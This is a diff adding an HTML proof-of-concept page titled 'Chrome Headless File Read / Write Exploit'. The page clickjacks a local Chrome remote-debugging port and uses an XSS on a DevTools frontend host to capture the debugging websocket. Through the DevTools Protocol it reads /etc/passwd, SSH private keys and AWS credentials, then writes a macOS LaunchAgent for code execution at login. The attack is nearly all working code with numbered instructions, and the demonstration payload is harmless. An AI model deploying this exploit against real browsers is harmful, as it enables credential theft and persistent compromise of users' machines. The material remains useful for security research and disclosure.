@@ -1,0 +1,207 @@
+<html>
+  <head>
+
+   <script>window.module = {exports:{}}</script>
+   <script src="https://cdn.jsdelivr.net/npm/chrome-remote-interface@0.31.0/chrome-remote-interface.min.js" onload="window.CDP = module.exports.CDP"></script>
+    <script>
+    async function init() {
+        
+        console.log("init");
+
+        const clickJackFrm = document.getElementById('clickJack');
+        const bridgeFrm = document.getElementById('bridge');
+        const wrapperDiv = document.getElementById('wrapper');
+        clickJackFrm.addEventListener('load', frameInit);
+        
+        async function frameInit() {
+            bridgeFrm.src = `https://chrome-devtools-frontend.appspot.com/serve_rev/@191797/devtools.html?remoteFrontendUrl=javascript:top.postMessage(top.frames[1].location.href,"*")`;
+            window.addEventListener("message", async(event) => {
+                if (event.origin == "https://chrome-devtools-frontend.appspot.com") {
+                    let ws = "ws://" + event.data.match(/ws=(.*?)\&/)[1];
+                    wrapperDiv.style.display = "none";
+                    run(ws)
+                }
+            }, false);
+        }
+        async function run(ws){
+            window.criRequest = function(options, cb) {
+                console.log(options)
+                if(options.path == '/json/list'){
+                    cb(null, JSON.stringify([{"webSocketDebuggerUrl": ws}]))
+                }
+            }
+            try{
+                // this is used to trick chrome-remote-interface into being usable in the browser
+                // we are sending it the websocket URL for the "page" from the click instead of the "browser"
+                const client = await window.CDP({local:true});
+                const { Page, Runtime} = client;
+
+                const users = await getUsers();
+                alert(`System Users: \n${users.join(',')}`)
+
+                let file = 'file:///etc/passwd';
+                let data = await readFile(file);
+                alert(`Contents of ${file}: \n----------------------------------------\n\n${data.substring(0,400)}...`);
+
+                file = 'file:///Users/'+users[0]+'/.ssh/id_rsa';
+                data = await readFile(file);
+                data = data.replace(/(-\n)(\S{5}).*(\n)/s,'$1$2*************...$3')
+                alert(`Contents of ${file}: \n----------------------------------------\n\n${data}`);
+
+                file = 'file:///Users/'+users[0]+'/.aws/credentials';
+                data = await readFile(file);
+                data = data.replace(/(= \w{3})\w+/gs,'$1*************')
+                alert(`Contents of ${file}: \n----------------------------------------\n\n${data}`);
+                
+                let path = '/Users/'+users[0]+'/Library/LaunchAgents/';
+                file = 'chromeRCE.plist';
+
+                data = await writeFile(path, file, `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+   <key>Label</key>
+   <string>com.user.pwn</string>
+   <key>ProgramArguments</key>
+   <array><string>/System/Applications/Calculator.app/Contents/MacOS/Calculator</string></array>
+   <key>RunAtLoad</key>
+   <true/>
+</dict>
+</plist>`);
+console.log(data);
+alert(`Wrote file: ${path}${file}.`)
+
+                async function readFile(path){
+                    await loadUrl(path);
+                    const { result } = await Runtime.evaluate({
+                        expression: 'document.body.outerText'
+                    });
+                    return result.value;  
+                }
+
+                function loadUrl(url) {
+                    return new Promise(async (fulfill, reject) => {
+                        Page.loadEventFired(() => {
+                            fulfill({client, url});
+                        });
+                        await Page.enable();
+                        await Page.navigate({url});
+                    });
+                }
+                
+                async function getUsers(){
+                    await loadUrl('file:///users/');
+                    const { result } = await Runtime.evaluate({
+                        returnByValue: true,
+                        expression: `
+                            scripts = Array.from( document.querySelectorAll( 'script' ), element => element.textContent)
+                            rows = scripts.filter((row)=>{
+                                return row.startsWith('addRow');
+                            }).map((row)=>{
+                                const items = JSON.parse('[' + row.substring(7,row.length-2) + ']');
+                                return [items[0], items[2], items[5]]
+                            }).filter((items)=>{
+                                return items[1]
+                            }).sort((a,b)=>{
+                                return b[2] - a[2]
+                            }).map((item)=>{return item[0]});`
+                    });
+
+                    return result.value; 
+ 
+                }
+
+                async function writeFile(path, filename, content){
+                    console.log(path)
+                    await Page.setDownloadBehavior({behavior: "allow", downloadPath: path});
+                    const expression = `var myBlob = new Blob([\`${content}\`], {type: "text/plain"});
+                        blobURL = URL.createObjectURL(myBlob);
+                        var link = document.createElement("a");
+                        link.setAttribute("href", blobURL);
+                        link.setAttribute("download", "${filename}");
+                        document.body.appendChild(link);
+                        link.click();
+                        blobURL`;
+                    const { result } = await Runtime.evaluate({expression});
+                    return result.value;
+                }
+
+            }catch(e){
+                console.error(e);
+            }
+
+        }
+
+    }
+    window.addEventListener("load", init);
+    </script>
+
+    <style>
+
+    body {
+        font-family: "Google Sans",Arial,sans-serif
+    }
+    li {
+      margin-bottom: 10px;
+    }
+    .button {
+          background: #1a73e8;
+          color: white;
+          width: 300px;
+          height: 60px;
+          font-size: 22px;
+          border: none;
+          border-width: 1px;
+          border-radius: 5px;
+          position: absolute;
+          padding: 10px;
+          left: 10px; top: 20px; 
+      }
+      #wrapper{
+        height: 200px;
+        overflow: hidden;
+        position:relative;
+        height: 100px;
+        width: 400px;
+      }
+      #clickJack{
+          transform: scale(4);
+          transform-origin: 10px 55px;
+          opacity: 0.20;
+      }
+      </style>
+      
+  </head>
+
+
+  <body>
+    <h1 style="color: #5f6368;">Chrome Headless File Read / Write Exploit</h1>
+    <hr />
+    <ol style="color:gray;">
+        <li>Open Chrome with --remote-debugging-port=9222 --headless: <br><code>$ /Applications/Google\ Chrome\ Canary.app/Contents/MacOS/Google\ Chrome\ Canary about:blank --remote-debugging-port=9222 --headless</code></li>
+        <li>The URL http://127.0.0.1:9222 is in an iframe to "clickjack". </li>
+        <li>When clickjacked the URL will become chrome-devtools-frontend.appspot.com with the local websocket address as part of the query string.</li>
+        <li>When the frame loads we use an XSS in chrome-devtools-frontend.appspot.com in another frame as a "bridge" to capture this WS url cross origin.</li>
+        <li>A with the websocket URL we can connect to the Chrome DevTools Protocol (CDP) using "chrome-remote-interface".</li>
+        <li>Read local files:
+            <ul>
+                <li>Page.navigate vis CDP is called forcing a browse to a "file://" URL</li>
+                <li>Runtime.evaluate is called to read the "innerText" of the page.</li>
+            </ul>
+        </li>
+        <li>Write local files (leading to RCE): 
+            <ul>
+                <li>Page.setDownloadBehavior is used to set the downloadPath where we want to save the file.</li>
+                <li>Runtime.evaluate is used to create a new Blob in the browser.</li>
+                <li>A link with the "download" attribute is clicked via javascript to trigger the download.</li>
+                <li>We write a "LaunchAgent" to /users/[username]/LaunchAgents resulting in an RCE when the user reboots.</li>
+            </ul>
+        </li>
+    </ol>
+    <iframe id="bridge" style="display:none" src=""></iframe>
+    <div id="wrapper">
+      <button class="button">CLICK ME!!!</button>
+      <iframe id="clickJack" style="position: absolute;" src="http://127.0.0.1:9222"></iframe>
+    </div>
+  </body>
+</html>
